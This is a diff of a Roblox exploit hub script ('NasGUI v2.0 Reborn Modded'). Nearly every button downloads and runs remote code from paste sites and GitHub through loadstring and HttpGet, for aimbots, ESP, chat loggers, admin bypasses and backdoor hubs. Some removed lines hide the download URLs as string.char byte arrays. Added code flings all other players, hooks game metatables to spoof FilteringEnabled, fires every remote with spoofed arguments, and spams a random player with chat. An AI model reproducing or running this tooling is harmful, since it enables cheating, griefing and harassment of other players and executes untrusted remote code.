@@ -1,24 +1,136 @@
--- FIX INVISIBLE UTF-8 BOM (Github adds these sometimes)
-do
-    -- If the file starts with the UTF-8 BOM byte, reload a clean version
-    if string.byte(string.sub(debug.getinfo(1).source, 1, 1)) == 239 then
-        local url = "https://raw.githubusercontent.com/realNasser9229/NasGUI/main/source.lua"
+-- EXTREME NasGUI v2.0 REBORN MODDED INTRO WITH BLUR + GUARANTEED LOAD (UPDATED URL)
+local CoreGui = game:GetService("CoreGui")
+local RunService = game:GetService("RunService")
 
-        -- Download raw source
-        local src = game:HttpGet(url)
-
-        -- Remove UTF-8 BOM if present
-        src = src:gsub("^\239\187\191", "")
-
-        -- Reload script without BOM and stop the current one
-        loadstring(src)()
-        return
-    end
+-- CLEANUP
+if CoreGui:FindFirstChild("NasIntroV2") then
+    CoreGui.NasIntroV2:Destroy()
 end
 
-print(">> Nas9229alt's SUPER OP NasGUI V2.0 loaded successfully, GO REKT THEM NOW!!! (BY NAS / nas9229alt & JAN / 1602sasa2)")
+local scr = Instance.new("ScreenGui")
+scr.Name = "NasIntroV2"
+scr.Parent = CoreGui
+scr.IgnoreGuiInset = true
 
-local function init()
+-- BLUR EFFECT
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = game:GetService("Lighting")
+
+local function fadeBlur(startSize, endSize, duration)
+    task.spawn(function()
+        local elapsed = 0
+        while elapsed < duration do
+            local delta = RunService.RenderStepped:Wait()
+            elapsed = elapsed + delta
+            blur.Size = startSize + (endSize - startSize) * (elapsed / duration)
+        end
+        blur.Size = endSize
+    end)
+end
+
+-- GUI FADE FUNCTION
+local function fade(obj, startT, endT, duration)
+    task.spawn(function()
+        local elapsed = 0
+        while elapsed < duration do
+            local delta = RunService.RenderStepped:Wait()
+            elapsed = elapsed + delta
+            local alpha = math.clamp(startT + (endT - startT) * (elapsed/duration), 0, 1)
+
+            if obj:IsA("Frame") then
+                obj.BackgroundTransparency = 1 - alpha
+            elseif obj:IsA("TextLabel") then
+                obj.TextTransparency = 1 - alpha
+            end
+        end
+
+        if obj:IsA("Frame") then
+            obj.BackgroundTransparency = 1 - endT
+        elseif obj:IsA("TextLabel") then
+            obj.TextTransparency = 1 - endT
+        end
+    end)
+end
+
+-- BACKGROUND
+local bg = Instance.new("Frame", scr)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(200,0,0)
+bg.BackgroundTransparency = 1
+bg.BorderSizePixel = 0
+
+local gradient = Instance.new("UIGradient", bg)
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(180,0,0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255,50,50))
+}
+gradient.Rotation = 45
+
+-- TEXT
+local title = Instance.new("TextLabel", scr)
+title.Size = UDim2.new(1,-40,0,80)
+title.Position = UDim2.new(0,20,0.35,0)
+title.BackgroundTransparency = 1
+title.Text = "NASGUI v2.0 REBORN MODDED"
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 40
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextTransparency = 1
+title.TextScaled = true
+
+local sub = Instance.new("TextLabel", scr)
+sub.Size = UDim2.new(1,-40,0,40)
+sub.Position = UDim2.new(0,20,0.5,0)
+sub.BackgroundTransparency = 1
+sub.Text = "UNLEASHING CHAOS..."
+sub.Font = Enum.Font.GothamBold
+sub.TextSize = 24
+sub.TextColor3 = Color3.fromRGB(255,255,255)
+sub.TextTransparency = 1
+sub.TextScaled = true
+
+-- AUDIO
+local sound = Instance.new("Sound", scr)
+sound.SoundId = "rbxassetid://9085309015"
+sound.Volume = 1
+sound:Play()
+
+-----------------------------------------
+-- INTRO SEQUENCE
+-----------------------------------------
+
+-- 1. Blur fade in
+fadeBlur(0,25,0.8)
+task.wait(0.8)
+
+-- 2. Red gradient fade + text fade in
+fade(bg,1,0,1.0)
+fade(title,1,0,1.0)
+fade(sub,1,0,1.0)
+task.wait(1.0)
+
+-- 3. Cinematic hold
+task.wait(1.2)
+
+-- 4. Fade out everything
+fade(title,0,1,0.8)
+fade(sub,0,1,0.8)
+fade(bg,0,1,0.8)
+task.wait(0.8)
+
+-- 6. Blur fades out AFTER NasGUI is already open
+task.wait(0.5)
+fadeBlur(25,0,1.0)
+task.wait(1.0)
+
+-- 7. Cleanup
+scr:Destroy()
+blur:Destroy()
+
+print(">> Nas9229alt's SUPER OP NasGUI V2.0 loaded successfully! GO REKT THEM NOW!!!")
+
+
 -- Services
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -28,8 +140,8 @@ local RunService = game:GetService("RunService")
 
 -- Play startup sound
 local startupSound = Instance.new("Sound", workspace)
-startupSound.SoundId = "rbxassetid://126083075694948"
-startupSound.Volume = 5
+startupSound.SoundId = "rbxassetid://9118823100"
+startupSound.Volume = 4.5
 startupSound:Play()
 
 
@@ -83,7 +195,7 @@ mainFrame.Draggable = true
 local bgImage = Instance.new("ImageLabel", mainFrame)
 bgImage.Size = UDim2.new(1, 0, 1, 0)
 bgImage.BackgroundTransparency = 1
-bgImage.Image = "rbxassetid://82411403129832" -- Cozy red/black abstract vibe
+bgImage.Image = "rbxassetid://2151741365" -- Cozy red/black abstract vibe
 bgImage.ImageTransparency = 0.3
 bgImage.ZIndex = 0
 
@@ -96,7 +208,7 @@ title.BackgroundTransparency = 1
 title.Text = "NasGUI Reborn v2.0 MODDED"
 title.Font = Enum.Font.GothamBlack
 title.TextSize = 20
-title.TextColor3 = Color3.fromRGB(228, 42, 42)
+title.TextColor3 = Color3.fromRGB(128, 0, 0)
 title.TextXAlignment = Enum.TextXAlignment.Left
 title.ZIndex = 1
 
@@ -282,41 +394,12 @@ local buttons = {
         snd.Looped = true snd.Volume = 10 snd.PlaybackSpeed = 0.17 snd:Play()
     end},
     {"Decal Spam", function()
-        -- ID of the decal
-local decalId = "130720573923509"
-
--- Function to apply decal to a part
-local function applyDecal(part)
-    if part:IsA("BasePart") then
-        -- Apply decal on all 6 surfaces
-        local surfaces = {
-            Enum.NormalId.Top,
-            Enum.NormalId.Bottom,
-            Enum.NormalId.Left,
-            Enum.NormalId.Right,
-            Enum.NormalId.Front,
-            Enum.NormalId.Back
-        }
-        for _, surface in pairs(surfaces) do
-            local decal = Instance.new("Decal")
-            decal.Texture = "rbxassetid://" .. decalId
-            decal.Face = surface
-            decal.Parent = part
+        for _, v in pairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local d = Instance.new("Decal", v)
+                d.Texture = "rbxassetid://82411403129832"
+            end
         end
-    end
-end
-
--- Loop through all descendants in workspace
-for _, obj in pairs(workspace:GetDescendants()) do
-    applyDecal(obj)
-end
-
--- Optional: run whenever new parts are added
-workspace.DescendantAdded:Connect(function(obj)
-    applyDecal(obj)
-end)
-
-print("All parts now have the decal everywhere! 🗿")
     end},
     {"Set Particles", function()
         for _, v in pairs(workspace:GetDescendants()) do
@@ -352,8 +435,8 @@ print("All parts now have the decal everywhere! 🗿")
     {"Jork", function()
         loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))()
     end},
-    {"Sirius", function()
-        loadstring(game:HttpGet('https://sirius.menu/sirius'))()
+    {"MrBean Jumpscare", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Mr-Bean-Jumpscare-8856"))()
     end},
     {"Skrubl0rdz Skybox", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lkidd-skybox-script-10964"))()
@@ -370,8 +453,8 @@ print("All parts now have the decal everywhere! 🗿")
     {"FE Invisible", function()
         loadstring(game:HttpGet("https://pastefy.app/mjkbQzXk/raw"))()
     end},
-    {"Anti-Bang", function()
-        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anti-Bang-Script-39958"))()
+    {"Fly Tool", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Tool-34005"))()
     end},
     {"Freaky Ahh Messages", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Freaky-ahh-quotes-by-me-43270"))()
@@ -379,17 +462,14 @@ print("All parts now have the decal everywhere! 🗿")
     {"Fake R6 FE", function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/R6.txt"))()
     end},
-    {"c00lgui by team c00lkidd", function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/36410b4f949d3a10e8b39fc7cdcc8cfb67aefe25/c00l%20gui"))()
-    end},
-    {"Skeleton Skybox", function()
-        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Skeleton-skybox-53658"))()
+    {"Chat Logger", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Chat-Logger-24902"))()
     end},
     {"Anti-Chat Logger", function()
         loadstring(game:HttpGet("https://pastebin.com/raw/qjDfA6E5"))()
     end},
-    {"Dance GUI by Nas", function()
-        loadstring(game:HttpGet("https://pastefy.app/lmRy7mqO/raw"))()
+    {"ESP Tracers", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Exunys-ESP-7126"))()
     end},
     {"FE Goofy Animations", function()
         loadstring(game:HttpGet("https://pastebin.com/raw/UQhaBfEZ"))()
@@ -403,7 +483,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/
     {"OP Sword Tool", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Linked-Sword-R6-Script-40329"))()
     end},
-    {"FE KJ R6", function()
+    {"FE KJ", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-Temu-KJ-IMPROVED-19618"))()
     end},
     {"Auto Heal", function()
@@ -416,11 +496,11 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/
             end
         end)
     end},
-    {"Animation Grabber", function()
-        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anim-Grabber-21176"))()
+    {"R6 Dances FE", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-EPIK-R6-DANCEZZ-43816"))()
     end},
-    {"LALOL Hub Backdoor", function()
-        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-Hub-Backdoor-58564"))()
+    {"Arceus X Aimbot", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Arceus-X-Aimbot-13242"))()
     end},
     {"Billboard GUI", function()
         local billboard = Instance.new("BillboardGui")
@@ -504,8 +584,27 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/
         trail.WidthScale = NumberSequence.new(0.5)
         trail.Parent = hrp
     end},
-    {"FE R15 Sonic 2", function()
-        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-R15-Sonic-The-Hedgehog-63923"))()
+    {"Become Nas9229alt", function()
+        local userId = 3902404879
+        local success, asset = pcall(function()
+            return game:GetService("InsertService"):LoadAsset(userId)
+        end)
+        if success and asset then
+            local clone = asset:FindFirstChildWhichIsA("Model")
+            if clone then
+                clone.Parent = workspace
+                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    local hrp = LocalPlayer.Character.HumanoidRootPart
+                    clone:SetPrimaryPartCFrame(hrp.CFrame)
+                end
+                LocalPlayer.Character:Destroy()
+                LocalPlayer.Character = clone
+            else
+                warn("No model found in asset.")
+            end
+        else
+            warn("Failed to load Nas9229alt model: "..tostring(asset))
+        end
     end},
     {"Create Team", function()
         local Teams = game:GetService("Teams")
@@ -593,9 +692,6 @@ end},
     {"VC Unbanner", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Voice-Chat-Unban-42843"))()
     end},
-    {"JanGUI V2 [NEWER]", function()
-        loadstring(game:HttpGet("https://pastefy.app/Sfeg0MGf/raw")()
-    end},
     {"SaveInstance V2", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universally-saveinstance-V2-42081"))()
     end},
@@ -611,96 +707,8 @@ end},
     {"FE Sword Tool", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Classic-Sword-Fling-Tool-16842"))()
     end},
-    {"Drop-Kick Tool FE", function()
-        -- Drop Kick Tool Script (Executor Version)
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local lp = Players.LocalPlayer
-local char = lp.Character or lp.CharacterAdded:Wait()
-local hrp = char:WaitForChild("HumanoidRootPart")
-local hum = char:WaitForChild("Humanoid")
-
--- Tool creation
-local tool = Instance.new("Tool")
-tool.Name = "Drop Kick"
-tool.RequiresHandle = false
-tool.CanBeDropped = false
-tool.Parent = lp.Backpack
-
--- Animation setup
-local anim = Instance.new("Animation")
-anim.AnimationId = "rbxassetid://45737360" -- previous kick ID
-local track = hum:LoadAnimation(anim)
-
--- Anti-spam cooldown
-local canUse = true
-local cooldown = 1 -- seconds
-
--- Dash function (controlled forward movement)
-local function dash(duration, dashSpeed)
-    local startTime = tick()
-    local originalWalkSpeed = hum.WalkSpeed
-    hum.WalkSpeed = 0 -- disable walking
-
-    local connection
-    connection = RunService.Heartbeat:Connect(function(dt)
-        if tick() - startTime > duration then
-            connection:Disconnect()
-            hum.WalkSpeed = originalWalkSpeed
-            if track.IsPlaying then track:Stop() end
-            return
-        end
-
-        -- Move HRP forward in controlled manner
-        local lookDir = hrp.CFrame.LookVector
-        hrp.CFrame = hrp.CFrame + lookDir * dashSpeed * dt
-    end)
-end
-
--- Crash Out style fling (only affects HRP, subtle oscillation)
-local hiddenfling = false
-local movel = 0.1
-local flingPower = 999999 -- adjust as you like
-
-task.spawn(function()
-    while true do
-        RunService.Heartbeat:Wait()
-        if hiddenfling and hrp then
-            local vel = hrp.Velocity
-            hrp.Velocity = vel * flingPower + Vector3.new(0, flingPower, 0)
-            RunService.RenderStepped:Wait()
-            if hrp then hrp.Velocity = vel end
-            RunService.Stepped:Wait()
-            if hrp then
-                hrp.Velocity = vel + Vector3.new(0, movel, 0)
-                movel = -movel
-            end
-        end
-    end
-end)
-
--- Tool activation
-tool.Activated:Connect(function()
-    if not canUse then return end
-    canUse = false
-
-    if track.IsPlaying then track:Stop() end
-    track:Play()
-    track:AdjustSpeed(1.7)
-
-    -- Start fling immediately
-    hiddenfling = true
-    task.delay(1, function()
-        hiddenfling = false
-    end)
-
-    -- Dash controlled
-    dash(1, 39)
-
-    task.delay(cooldown, function()
-        canUse = true
-    end)
-end)
+    {"Monster Mash", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Monster-Mash-Tool-Script-24283"))()
     end},
     {"RemoteSpy V3", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RemoteSpy-v3-33731"))()
@@ -711,14 +719,14 @@ end)
     {"Adonis Bypass", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-adonis-admin-bypass-19375"))()
     end},
-    {"FE Omniman R15", function()
+    {"FE Omni-Man", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Omniman-49493"))()
     end},
     {"Retro Animations R6", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Classic-Animations-2971"))()
     end},
-    {"MorfOS", function()
-   loadstring(game:HttpGet("https://raw.githubusercontent.com/formidy/morfOS/refs/heads/main/main.lua"))()
+    {"Delta UI", function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-delta-executor-ui-but-its-a-script-52949"))()
     end},
     {"Private Chat", function()
         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-a-secretive-Fe-chat-for-communication-without-filtering-49526"))()
@@ -856,23 +864,161 @@ end},
 
     print("[Friends ESP] Active: highlighting all friends in yellow")
 end},
-{"FORCE TOUCH GUI", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FORCE-TOUCH-GUI-UNIVERSAL-OP-CAN-KILL-OR-KICK-43469"))()
-end},
-{"FE R15 Sonic", function()
-     loadstring(game:HttpGet("https://pastefy.app/XCtZsGhP/raw"))()
-end},
-{"FE R15 Invincible Flight", function()
-     loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))()
-end},
-{"JanGUI V1.0 Normal", function()
--- Jangui v1.0 Normal
--- Made by Jan
+{"View RCCService", function()
+    local CoreGui = game:GetService("CoreGui")
+    local Workspace = game:GetService("Workspace")
 
-local u = string.char(
-104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,102,57,55,68,50,74,118,85
-)
-loadstring(game:HttpGet(u, true))()
+    -- Try to get RCCService (dummy / client-side)
+    local success, RCC = pcall(function()
+        return getmetatable(game) and game:FindFirstChild("RCCService") or nil
+    end)
+    
+    -- Create local mimicker table
+    local RCCMimic = {}
+    if success and RCC then
+        for k,v in pairs(RCC:GetChildren()) do
+            RCCMimic[k] = v
+        end
+        print("[RCCService Mimic] Loaded properties:")
+        for k,v in pairs(RCCMimic) do
+            print(k,v)
+        end
+    else
+        print("[RCCService Mimic] RCCService not found, creating empty mimicker.")
+    end
+
+    -- GUI to view (and optionally edit) properties
+    local gui = Instance.new("ScreenGui", CoreGui)
+    gui.Name = "RCCMimicGUI"
+
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(0, 300, 0, 400)
+    frame.Position = UDim2.new(0, 10, 0, 10)
+    frame.BackgroundTransparency = 0.15
+
+    local list = Instance.new("ScrollingFrame", frame)
+    list.Size = UDim2.new(1,-10,1,-10)
+    list.Position = UDim2.new(0,5,0,5)
+    list.CanvasSize = UDim2.new(0,0,2,0)
+
+    local layout = Instance.new("UIListLayout", list)
+    layout.Padding = UDim.new(0,2)
+
+    for k,v in pairs(RCCMimic) do
+        local item = Instance.new("TextBox", list)
+        item.Size = UDim2.new(1,-10,0,25)
+        item.Text = k.." : "..tostring(v)
+        item.ClearTextOnFocus = false
+        item.FocusLost:Connect(function(enter)
+            if enter then
+                RCCMimic[k] = item.Text
+                print("[RCC Mimic] Local value changed:", k, "=", item.Text)
+            end
+        end)
+    end
+
+    print("[RCCService Viewer] GUI ready. You can view or locally edit mimicked values.")
+end},
+{"Fling All", function()
+    local Players = game:GetService("Players")
+    local RunService = game:GetService("RunService")
+    local LocalPlayer = Players.LocalPlayer
+    local Workspace = game:GetService("Workspace")
+
+    -- Duration for fling per player (seconds)
+    local flingTime = 1
+
+    -- Fling parameters
+    local flingSpeed = 100 -- adjust to match your Punch Tool fling
+
+    -- Function to fling a single player
+    local function flingTarget(targetHRP)
+        local startTime = tick()
+        local connection
+        connection = RunService.Heartbeat:Connect(function(dt)
+            if tick() - startTime > flingTime then
+                connection:Disconnect()
+                return
+            end
+            -- Alternate velocity for fling
+            targetHRP.Velocity = Vector3.new(flingSpeed, flingSpeed, flingSpeed)
+        end)
+    end
+
+    -- Loop through all players except local
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = player.Character.HumanoidRootPart
+
+            -- Teleport near them to ensure fling works locally
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                local myHRP = LocalPlayer.Character.HumanoidRootPart
+                local originalPos = myHRP.Position
+                myHRP.CFrame = hrp.CFrame + Vector3.new(0, 0, 3) -- slight offset
+                flingTarget(hrp)
+                myHRP.CFrame = CFrame.new(originalPos)
+            else
+                flingTarget(hrp)
+            end
+        end
+    end
+
+    print("[Fling All] Activated on all players")
+end},
+{"Math Interrogation", function()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local ChatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+    local Workspace = game:GetService("Workspace")
+    
+    -- Pick a random target
+    local targets = {}
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            table.insert(targets, player)
+        end
+    end
+    if #targets == 0 then return print("[Math Interrogation] No valid targets") end
+
+    local target = targets[math.random(1,#targets)]
+    local targetHRP = target.Character.HumanoidRootPart
+
+    if not (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then return end
+    local myHRP = LocalPlayer.Character.HumanoidRootPart
+    local originalCFrame = myHRP.CFrame
+
+    -- Move your character in front of them locally
+    myHRP.CFrame = targetHRP.CFrame * CFrame.new(0,0,2)
+
+    -- Function to ask a random math question
+    local function askQuestion()
+        local a, b = math.random(1,20), math.random(1,20)
+        local answer = a + b
+        local questionText = "[Math Interrogation] Hey "..target.Name..", what is "..a.." + "..b.." ?"
+
+        -- Fire question to chat
+        ChatEvent:FireServer(questionText, "All")
+        print("[Math Interrogation] Asked:", questionText)
+
+        -- Listen to local chat for answers
+        local conn
+        conn = Players.PlayerAdded:Connect(function() end) -- dummy to prevent error if needed
+        conn = Players.LocalPlayer.Chatted:Connect(function(msg)
+            -- Check if the target answered correctly (number only)
+            local num = tonumber(msg)
+            if num and num == answer then
+                print("[Math Interrogation] Correct answer by "..target.Name)
+                myHRP.CFrame = originalCFrame
+                conn:Disconnect()
+            elseif num then
+                print("[Math Interrogation] Wrong answer by "..target.Name..", asking again...")
+                task.delay(1, askQuestion)
+            end
+        end)
+    end
+
+    askQuestion()
 end},
 {"Fire TouchInterests", function()
     local Workspace = game:GetService("Workspace")
@@ -1027,45 +1173,117 @@ end},
         removeSpoof()
     end
 end},
-{"JanDestroy GUI", function()
-     loadstring(game:HttpGet("https://pastebin.com/raw/uJ0P9mfE"))()
+{"Client-Side Chat Filter Remover", function()
+    local success, TextChatService = pcall(function()
+        return game:GetService("TextChatService")
+    end)
+    if not success or not TextChatService then
+        warn("[ChatFilterRemover] TextChatService unavailable in this game")
+        return
+    end
+
+    -- Hook the message processing locally
+    local mt = getrawmetatable(TextChatService)
+    setreadonly(mt,false)
+    local old_index = mt.__index
+    mt.__index = newcclosure(function(self,key)
+        if key == "OnIncomingMessage" then
+            -- Override to bypass filtering
+            return function(msgObj)
+                -- Display raw message locally
+                -- You can also add a custom GUI here if desired
+                print("[Unfiltered Chat] "..msgObj.Text)
+                return msgObj
+            end
+        end
+        return old_index(self,key)
+    end)
+    setreadonly(mt,true)
+
+    print("[ChatFilterRemover] Local chat filter bypass active. Only affects your client.")
 end},
-{"c00lgui Reborn v0.5", function()
-     loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
+{"Show FilteringEnabled (DEX)", function()
+    local Workspace = game:GetService("Workspace")
+
+    -- Safely try setHiddenProperty
+    local ok, err = pcall(function()
+        if setHiddenProperty then
+            setHiddenProperty(Workspace, "FilteringEnabled", false)
+        elseif sethiddenproperty then
+            sethiddenproperty(Workspace, "FilteringEnabled", false)
+        else
+            error("setHiddenProperty unavailable")
+        end
+    end)
+
+    if ok then
+        print("[FE State] Workspace.FilteringEnabled set locally to false (Dex will see this).")
+    else
+        warn("[FE State] Failed: "..tostring(err))
+    end
+
+    -- Hook metatable so local scripts also see false
+    local mt = getrawmetatable(game)
+    setreadonly(mt,false)
+    local old_index = mt.__index
+    mt.__index = newcclosure(function(self,key)
+        if self == Workspace and key == "FilteringEnabled" then
+            return false
+        end
+        return old_index(self,key)
+    end)
+    setreadonly(mt,true)
+
+    print("[FE State] Local reads of Workspace.FilteringEnabled now return false")
 end},
-{"Anti-Ragdoll & Fling", function()
-     loadstring(game:HttpGet("https://pastefy.app/UiCdR9IH/raw"))()
+{"RBXNet FE Bypass", function()
+    pcall(function()
+        local function spoofArgs(args)
+            local newArgs = {}
+            for i, arg in ipairs(args) do
+                if type(arg) == "number" then
+                    newArgs[i] = math.random(-100, 100)
+                elseif type(arg) == "string" then
+                    newArgs[i] = "NasGUI_Pwned_" .. arg
+                elseif type(arg) == "boolean" then
+                    newArgs[i] = not arg
+                else
+                    newArgs[i] = arg
+                end
+            end
+            return newArgs
+        end
+        for _, obj in pairs(game:GetDescendants()) do
+            if obj:IsA("RemoteEvent") then
+                pcall(function()
+                    local connections = getconnections(obj.OnServerEvent)
+                    for _, conn in pairs(connections) do
+                        if conn.Function then
+                            local originalFunc = conn.Function
+                            conn:Disable()
+                            conn.Function = function(...)
+                                local args = spoofArgs({...})
+                                return originalFunc(unpack(args))
+                            end
+                            conn:Enable()
+                        end
+                    end
+                    obj:FireServer(unpack(spoofArgs({nil})))
+                end)
+            elseif obj:IsA("RemoteFunction") then
+                pcall(function()
+                    obj:InvokeServer(unpack(spoofArgs({nil})))
+                end)
+            end
+        end
+        warn("RBXNet FE Bypass attempt complete! Spoofed remote arguments and fired all remotes.")
+    end)
 end},
 {"Infinite Yield", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end},
-{"JanGUI [NEW]", function()
--- Made by JAN
-    loadstring(game:HttpGet("https://pastefy.app/pviNRilX/raw"))()
-end},
-{"FE Forsaken", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Forsakination-48596"))()
-end},
-{"T0PK3K 5.0", function()
-    loadstring(game:HttpGet("https://gist.githubusercontent.com/nosyliam/3a0464974205a93d31b9f188ace47a53/raw/983b37288a04ce048b9a8cde36fefa0b7564691a/tksrc.lua"))()
-end},
-{"J44sGUI by Jan & Nas", function()
-    loadstring(game:HttpGet("https://pastefy.app/zhHfBbeA/raw"))()
-end},
-{"Audio Logger", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Audio-Logger-1522"))()
-end},
-{"FE TikTok Emotes 2024", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Tiktok-Emotes-Script-2024-R15-Only-49032"))()
-end},
-{"Brookhaven c00lkidd Skybox", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-skybox-c00lkidd-59724"))()
-end},
-{"Secret Service Panel", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Secret-Service-panel-9623"))()
-end},
-{"Wait They Don't Love You Dance", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Wait-They-Dont-Love-You-Like-I-Love-You-Animation-Dance-24631"))()
+{"TOPK3K", function()
+    loadstring(game:HttpGet("https://gist.githubusercontent.com/nosyliam/13a8b0aaf95bf30405e4f1dbb87d5be4/raw/cde5ffc846aec67e14b08878fb286baae21b91c9/tksrc.lua"))()
 end}
 }
 
@@ -1273,28 +1491,19 @@ yPos += 40
 
 -- Grab Knife
 createMiscButton(yPos, "Grab Knife V4", function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-Knife-V4-56561"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Xt6s2v4v"))()
 end)
 yPos += 40
 
--- NasGUI V1.0
-createMiscButton(yPos, "[Ancient] NasGUI V1.0", function()
-    loadstring(game:HttpGet("https://pastefy.app/P7a8Lj5Y/raw"))()
+-- Rainbow Carpet
+createMiscButton(yPos, "Rainbow Carpet", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Tool-34005"))()
 end)
 yPos += 40
 
--- NasGUI V1.6
-createMiscButton(yPos, "NasGUI V1.6 Reborn", function()
-    -- The new era of NasGUI is out! Meet the new NASGUI V1.6 REBORN!
--- Scripted, revamped by nas9229alt!
-
-
-local u = string.char(
-104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,111,79,71,76,73,85,90,69,47,114,97,119
-)
-
--- Wrap in loadstring to execute
-loadstring(game:HttpGet(u))()
+-- Hyperlaser Gun
+createMiscButton(yPos, "Hyperlaser Gun", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/hxXxYjth"))()
 end)
 yPos += 40
 
@@ -1308,12 +1517,34 @@ createMiscButton(yPos, "Anti-AFK", function()
 end)
 yPos += 40
 
--- nasgui v1.7.6
-createMiscButton(yPos, "NasGUI Reborn V1.7.6", function()
-    -- OMG! Newer NasGUI, and it is official; NASGUI V1.7.6 REBORN!!!
--- Made by nas9229alt
-
-loadstring(game:HttpGet("https://pastefy.app/PSwknTJR/raw?part=NasGUI-v1.7.6_REBORN.lua"))()
+-- Mesh Spam
+createMiscButton(yPos, "Mesh Spam", function()
+    local function spamMeshes(character)
+        local meshIds = {
+            "http://www.roblox.com/asset/?id=128639186",
+            "http://www.roblox.com/asset/?id=128639252",
+            "http://www.roblox.com/asset/?id=128639292",
+            "http://www.roblox.com/asset/?id=128639354"
+        }
+        while character and character.Parent do
+            for _, part in pairs(character:GetChildren()) do
+                if part:IsA("BasePart") then
+                    local oldMesh = part:FindFirstChildWhichIsA("SpecialMesh") 
+                                  or part:FindFirstChildWhichIsA("BlockMesh") 
+                                  or part:FindFirstChildWhichIsA("CylinderMesh")
+                    if oldMesh then oldMesh:Destroy() end
+                    local newMesh = Instance.new("SpecialMesh", part)
+                    newMesh.MeshId = meshIds[math.random(1,#meshIds)]
+                    newMesh.Scale = Vector3.new(1,1,1)
+                end
+            end
+            task.wait(0.5)
+        end
+    end
+    local character = game.Players.LocalPlayer.Character
+    if character then
+        spawn(function() spamMeshes(character) end)
+    end
 end)
 yPos += 40
 
@@ -1328,51 +1559,78 @@ createMiscButton(yPos, "Clone Yourself", function()
 end)
 yPos += 40
 
--- vooed
-createMiscButton(yPos, "Void Disabler", function()
-local VOID_HEIGHT = -math.huge  -- effectively disables void kill
-local CHECK_INTERVAL = 0.2
-
-game:GetService("RunService").Heartbeat:Connect(function()
